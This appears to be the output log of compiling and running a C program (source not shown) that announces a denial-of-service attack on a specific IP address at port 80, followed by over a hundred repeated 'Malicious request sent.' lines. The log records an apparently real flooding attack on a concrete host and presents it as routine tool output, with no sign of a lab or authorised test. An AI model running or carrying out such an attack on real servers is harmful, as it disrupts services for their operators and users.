Started at: 2025-08-24 09:12:03.166321
Command: gcc f15a679a.c -o f15a679a && ./f15a679a
--------------------------------------------------
[+] Launching DoS attack against 185.20.117.129:80
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
